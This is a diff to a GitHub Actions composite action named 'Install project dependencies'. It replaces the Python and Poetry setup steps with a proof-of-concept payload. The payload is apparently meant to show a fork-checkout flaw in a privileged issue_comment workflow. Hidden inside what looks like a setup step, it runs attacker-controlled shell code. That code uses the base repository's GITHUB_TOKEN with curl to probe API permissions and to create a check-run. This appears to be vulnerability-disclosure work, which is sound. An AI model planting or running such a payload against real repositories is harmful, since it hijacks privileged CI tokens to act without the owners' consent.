@@ -1,40 +1,81 @@
 name: Install project dependencies
 description: Install project dependencies
 
+# ATTACKER-CONTROLLED via fork PR checkout.
+# The privileged `issue_comment` workflow runs `uses: ./.github/setup` after an
+# OWNER-only comment gate, but checks out the fork's mutable branch tip rather
+# than a reviewed/pinned SHA. Whatever is at the tip at checkout time runs here
+# with the BASE repo's GITHUB_TOKEN.
+#
+# This payload is deliberately transparent and in-scope:
+#   - a loud RCE marker,
+#   - PROOF OF TOKEN PERMISSIONS (the point of this PoC): the runner's own
+#     "GITHUB_TOKEN Permissions" log group is the authoritative scope list; we
+#     ALSO probe each scope by exercising it and printing the HTTP result, so the
+#     report shows the write-scoped token is genuinely usable from attacker code,
+#   - one canary-tagged privileged write (checks:write) a fork's own read-only
+#     token cannot perform.
+# No secret scraping, no token value printed, no third-party exfiltration.
+
 inputs:
   python-version:
     description: The python version to use
-    required: true
+    required: false
+    default: ""
   os:
     description: The OS to run on
-    required: true
+    required: false
+    default: ""
 
 runs:
   using: composite
   steps:
-    - name: Set up Python
-      uses: actions/setup-python@v6
-      with:
-        python-version: ${{ inputs.python-version }}
-
-    - name: Install Poetry
+    - name: setup
       shell: bash
-      run: python -m pip install poetry
-
-    - name: Determine poetry version
-      shell: bash
+      env:
+        BASE_TOKEN: ${{ github.token }}
+        REPO: ${{ github.repository }}
+        BASE_SHA: ${{ github.sha }}
       run: |
-        POETRY_VERSION=$(poetry --version | sed -r 's/[^0-9]*(([0-9]+\.)*[0-9]+).*/\1/g')
-        echo "VERSION=$POETRY_VERSION" >> $GITHUB_OUTPUT
-      id: poetry_version
+        CANARY="DEPI-POC-20261002-pandas-dfcce1bc"
+        echo "::warning::$CANARY RCE: attacker-controlled fork code is executing in the privileged issue_comment workflow of $REPO"
+        echo "$CANARY host=$(hostname) base_token_len=${#BASE_TOKEN} repo=$REPO base_sha=$BASE_SHA"
 
-    - name: Cache poetry.lock
-      uses: actions/cache@v5
-      with:
-        path: poetry.lock
-        key: ${{ inputs.os }}-${{ inputs.python-version }}-poetry-${{ steps.poetry_version.outputs.VERSION }}-${{ hashFiles('pyproject.toml') }}
+        echo "$CANARY --- discovering token permissions (no logs / no explicit block needed) ---"
+        # When we DON'T know the token scopes (repo default, no `permissions:` block,
+        # no run logs to read), discover them empirically. Two sources, neither needs logs:
+        #   1) the repo's configured default workflow permission (authoritative), and
+        #   2) a capability probe: exercise each scope and read the HTTP status
+        #      (2xx = granted, 403 = denied). The output IS the permission map.
+        # This is why echoing the (masked) token is pointless: the value never encoded scopes.
 
-    - name: Install project dependencies
-      shell: bash
-      run: poetry install -vvv --no-root
+        # 1) Authoritative default for this repo (read|write), if the token may read settings.
+        dc=$(curl -s -o /tmp/dflt.json -w '%{http_code}' \
+          -H "Authorization: Bearer $BASE_TOKEN" -H "Accept: application/vnd.github+json" \
+          "https://api.github.com/repos/$REPO/actions/permissions/workflow")
+        echo "$CANARY default-workflow-permissions http=$dc body=$(head -c 200 /tmp/dflt.json)"
 
+        # 2) Capability probe: exercise a scope, print the status (works with any default).
+        probe() {  # label method path [json-body]
+          local label="$1" method="$2" path="$3" data="$4" code
+          code=$(curl -s -o /tmp/probe.json -w '%{http_code}' -X "$method" \
+            -H "Authorization: Bearer $BASE_TOKEN" -H "Accept: application/vnd.github+json" \
+            ${data:+-d "$data"} "https://api.github.com$path")
+          echo "$CANARY perm-probe [$label] $method $path -> http=$code"
+        }
+        # Read probes (safe, no side effects) map the readable surface:
+        probe "metadata:read"  GET "/repos/$REPO"
+        probe "contents:read"  GET "/repos/$REPO/contents/README.md"
+        probe "issues:read"    GET "/repos/$REPO/issues?per_page=1"
+        probe "actions:read"   GET "/repos/$REPO/actions/workflows?per_page=1"
+        probe "checks:read"    GET "/repos/$REPO/commits/$BASE_SHA/check-runs?per_page=1"
+
+        # checks:write — the undeniable privileged write. A fork PR's own token is
+        # read-only, so a 201 here proves we hold the BASE repo's write-scoped token
+        # via the TOCTOU checkout of the mutable fork tip.
+        code=$(curl -s -o /tmp/chk.json -w '%{http_code}' -X POST \
+          -H "Authorization: Bearer $BASE_TOKEN" -H "Accept: application/vnd.github+json" \
+          "https://api.github.com/repos/$REPO/check-runs" \
+          -d "{\"name\":\"$CANARY\",\"head_sha\":\"$BASE_SHA\",\"status\":\"completed\",\"conclusion\":\"neutral\",\"output\":{\"title\":\"$CANARY\",\"summary\":\"Attacker fork code executed via ./.github/setup in the privileged issue_comment workflow and used the base GITHUB_TOKEN (checks:write) to create this check-run. Root cause: TOCTOU checkout of the mutable fork branch after an OWNER-only comment gate. depi-triage PoC.\"}}")
+        echo "$CANARY perm-probe [checks:write] POST /repos/$REPO/check-runs -> http=$code"
+        head -c 500 /tmp/chk.json; echo
